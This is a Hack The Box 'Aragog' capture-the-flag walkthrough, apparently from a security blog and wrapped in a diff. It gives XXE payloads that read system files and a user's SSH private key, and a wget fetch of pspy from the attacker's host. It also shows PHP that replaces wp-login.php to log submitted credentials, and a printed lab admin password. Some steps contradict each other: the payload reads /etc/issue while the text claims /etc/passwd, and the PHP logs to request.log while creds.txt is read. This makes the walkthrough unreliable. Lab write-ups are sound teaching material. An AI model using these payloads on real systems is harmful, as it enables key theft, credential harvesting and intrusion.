@@ -1,0 +1,147 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Box: Aragog Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-aragog-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-07-30T06:34:09+00:00">July 30, 2018</time><time class="updated" datetime="2025-07-05T16:29:57+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Hello Friends!! Today we are going to solve another CTF Challenge “Aragog”. This VM is also developed by Hack the Box, Aragog is a Retired Lab and there are multiple ways to breach into this VM.</span></p>
+<p><span style="color: #000000;"><strong>Level:</strong> Medium</span></p>
+<p><span style="color: #000000;"><strong>Task:</strong> Find the user.txt and root.txt in the vulnerable Lab.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<p><span style="color: #000000;"><strong>Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Open ports and Running services (Nmap)</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">FTP anonymous login</span></li>
+<li><span style="color: #000000;">Web Directory Enumeration</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploit XXE</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Intercept Browser request (Burp Suite)</span></li>
+<li><span style="color: #000000;">Access /etc/passwd file</span></li>
+<li><span style="color: #000000;">Steal SSH RSA key</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Access Victim’s shell (SSH login)</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Capture user.txt flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Capture root.txt flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Let’s Begin!!</strong></span></p>
+<p><span style="color: #000000;">As these labs are only available online, therefore, they have a static IP. Aragog Lab has IP: 10.10.10.78.</span></p>
+<p><span style="color: #000000;">Now, as always let’s begin our hacking with the port enumeration.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.10.10.78</pre>
+<p><span style="color: #000000;">Looking around its result we found ports 21, 22 and 80 are open. Moreover, we notice FTP anonymous login is allowed.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VaoiPATci7s/W16rSxoXXoI/AAAAAAAAYwM/Q5BgZTYOv209mLIMyId6ca0G09kihXAvwCEwYBhgL/s1600/1.png"/></span></p>
+<h3><span style="color: #800000;">Enumeration </span></h3>
+<p><span style="color: #000000;">So we try to connect with FTP through anonymous login. Here I found the test.txt file in the current directory. Then with the help of get command, we downloaded the<strong> test.txt</strong> file in our local machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ftp 10.10.10.78
+ls
+get test.txt 
+cat test.txt</pre>
+<p><span style="color: #000000;">inside test.txt file we observe something related to a subnet_mask in XML format, at this point, I was confused where I can implement this hint.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-C2l5X19wiTc/W16rT8tzjDI/AAAAAAAAYwY/KWJGSBqmCvInSd4raNg3EJFzBvyOiPp4wCEwYBhgL/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">Then we open target IP over web browser but didn’t found any remarkable thing here.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Tbenwpl6H2c/W16rUIZd5KI/AAAAAAAAYwQ/WxZTlV08-0I-MJRMu-9NX19HPF7NMrQRACEwYBhgL/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">When we found nothing at port 80, then though to use dirbuster for web directory brute-force attack.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-8qDVvng0QF0/W16rUENEBWI/AAAAAAAAYwc/m4QS1KSJiCQcALUqu1hBioDv8XO9zuOIACEwYBhgL/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">Here I found a /hosts.php file from its result.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-WkYmpH1ImvE/W16rUT12WNI/AAAAAAAAYwY/RzLT6iJ3vW0QTC8ptWoWN0D6FwwKFuY9wCEwYBhgL/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">When I have explored /hosts.php in the web browser I found a message “<em>There are 4294967294 possible hosts for</em>” as shown below image. So I search in Google for 4294967294 hosts which were related to 255.255.255.254 as found in the above test.txt file.</span></p>
+<p><span style="color: #000000;">It means we can post the test.txt file here with help of burp suite.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Q2PFRbZ8PSc/W16rVtJp6EI/AAAAAAAAYwQ/1e-iqYwBwHgwCVmv-xMu58XehtFstdGsACEwYBhgL/s1600/6.png"/></span></p>
+<h3><span style="color: #800000;">Exploit XXE (XML External Entity)</span></h3>
+<p><span style="color: #000000;">So let’s capture the request and sent the intercepted data into the repeater.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CUovwRxOviw/W16rV0wux3I/AAAAAAAAYwc/SHIFv70jpa8PIKRFWUkyRIN50FCayUBaQCEwYBhgL/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">As we have predicted the test.txt is in XML format so we have tried to validate XXE injection.</span></p>
+<pre class="lang:default decode:true">&lt;details&gt;
+&lt;subnet_mask&gt;&amp;xxe;&lt;/subnet_mask&gt;
+&lt;test&gt;&lt;/test&gt;
+&lt;/details&gt;</pre>
+<p><span style="color: #000000;">Luckily we found this is vulnerable to XXE injection.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-rOyC5EoRlw0/W16rV8-JR_I/AAAAAAAAYwc/dwkAsv7yDPYW-43N3a9ES4Kd3jhljpW8QCEwYBhgL/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">Hence now I can simply exploit it for fetching /etc/passwd file with help of following XXE script and then check its response.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE foo [ 
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM "file:////etc/issue" &gt;]&gt;
+&lt;details&gt;
+&lt;subnet_mask&gt;&amp;xxe;&lt;/subnet_mask&gt;
+&lt;test&gt;&lt;/test&gt;
+&lt;/details&gt;</pre>
+<p><span style="color: #000000;">Great!! We got the /passwd file successfully and enumerated two local usernames.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-GxGeNgwu2Oc/W16rWAPrBmI/AAAAAAAAYwg/H_EJVbBgWu4zsIbnE4rruZ4VxsZMyvP0ACEwYBhgL/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">With the help of /passwd file information, we try to get id_rsa through XXE script.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE foo [ 
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM "file:////home/florian/.ssh/id_rsa" &gt;]&gt;
+&lt;details&gt;
+    &lt;subnet_mask&gt;&amp;xxe;&lt;/subnet_mask&gt;
+    &lt;test&gt;&lt;/test&gt;
+&lt;/details&gt;</pre>
+<p><span style="color: #000000;">Yuppiee! We got the ssh private key successfully, that I copied in the text file and named as <strong>key</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-fZ9qg_qo29I/W16rShDGvII/AAAAAAAAYwQ/1h1gon1sqFkWshbvYv6rIuCwWS80CbHuwCEwYBhgL/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Then assign <strong>permission 600</strong> to saved key (id_rsa) and then try to connect with SSH as we knew the port 22 was open in the victim’s network.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd Desktop
+chmod 600 key
+ssh -i key florian@10.10.10.78</pre>
+<p><span style="color: #000000;">And as you can observe that we get login successfully and accessed the TTY shell of victim’s machine, now let’s find the user.txt file to finish the 1<sup>st</sup> task.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /home
+ls
+cd florian
+ls
+cat user.txt</pre>
+<p><span style="color: #000000;">1<sup>st</sup> task is completed; let’s find out root.txt to finish the 2<sup>nd</sup> task.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-06JI9nuTwLI/W16rSkkUgfI/AAAAAAAAYwY/H6K86zZc2T4Y9SF_TWE6dINliAngV4eowCEwYBhgL/s1600/11.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation </span></h3>
+<p><span style="color: #000000;">Inside /var/www/html we saw <strong>/dev_wiki</strong> and it was good to see that this folder holds WordPress setup and configuration files.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-0qBTANDT74g/W16rTOWFZVI/AAAAAAAAYwY/2xHdoFVqG6AUdm3slYfNCCQnXd8rubGagCEwYBhgL/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">So I simply add host IP: 10.10.10.78 and hostname: aragog is our local host file which is present inside /etc.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9H13CT63u40/W16rTZkaJMI/AAAAAAAAYwU/xpTdnXqFUno-sMq0AC-lJhYGVMQn2U5sACEwYBhgL/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">So we explore aragog/dev_wiki in our web browser and got the WordPress home page.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Ll-KhxJxpm4/W16rTiAchaI/AAAAAAAAYwU/zQ-MNykYZQc6MKTMIEXKvaEU4Zl19BpAACEwYBhgL/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">As you can observe inside /blog we found a message to Florian from<strong> Cliff</strong> where he had to express the mess of WordPress restoring in very few minutes.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-RAAmB9BbwU4/W16rTuu9qlI/AAAAAAAAYwU/BVn-LveC0sIf76Ko4dnjhdfhZhfGtQw6wCEwYBhgL/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">So with help of Google, I found a script <span style="color: #3366ff;"><a style="color: #3366ff;" href="https://github.com/DominicBreuker/pspy/blob/master/README.md">pspy32s</a></span> and download it in victim’s VM inside /tmp and also gave execution permission.</span></p>
+<p><span style="color: #000000;">pspy is a command line tool designed to snoop on processes without the need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
+wget http://10.10.14.6/pspy32s
+chmod +x pspy32s</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ksg4UfZrN7E/W16rUtGkQhI/AAAAAAAAYwU/rfAdY187VBEzQv8MX85JTpC1mej32PrIwCEwYBhgL/s1600/50.png"/></span></p>
+<p><span style="color: #000000;">After the particular time, we realize that there is a cron job that is frequently deleting the dev_wiki folder &amp; replacing it with the backup folder &amp; a script wp-login.py is ran shortly after that process occurs.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BBh9fIeMG7Y/W16rUic19YI/AAAAAAAAYwU/MGfQ97JD8gIjZ1O3k8XtxBXG0zFfxDdYwCEwYBhgL/s1600/51.png"/></span></p>
+<p><span style="color: #000000;">Now let’s manipulate the content of the wp-login.php file and place a new php code inside it to enumerate username and password.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo "" &gt; wp-login.php
+nano wp-login.php
+&lt;?php
+$req_dump = print_r($_REQUEST, TRUE);
+$fp = fopen('/tmp/request.log', 'a');
+fwrite($fp, $req_dump);
+fclose($fp);
+?&gt;
+cat wp-login.php</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://4.bp.blogspot.com/-wYHsv3rsOCs/W16rU7MePTI/AAAAAAAAYwY/8EWKp14pLM8s7YNuOt5FKYN7XdGL5A7XgCEwYBhgL/s1600/52.png"/></strong></span></p>
+<p><span style="color: #000000;">So this file will dump the credential after a few minutes inside /tmp.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
+cat creds.txt</pre>
+<p><span style="color: #000000;"><em>Administrator: !KRgYs(JFO!&amp;MTr)lf</em></span></p>
+<p><span style="color: #000000;">Hmm!!! We got the admin credential.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tOcA5AblKxE/W16rVLi5bVI/AAAAAAAAYwg/TxaxG-RAvz0HQtqwpvDKI0_Dnm-UpKbgwCEwYBhgL/s1600/53.png"/></span></p>
+<p><span style="color: #000000;">Now let’s grab the root.txt file quickly and finish this task.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">su root
+cd /root
+cat root.txt</pre>
+<p><span style="color: #000000;">We finished both tasks successfully!!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-FGuJSHDaojo/W16rVU0k5WI/AAAAAAAAYwU/-cERk05kOvImnt4gTxpC2Gyl4ledrXb_QCEwYBhgL/s1600/55.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
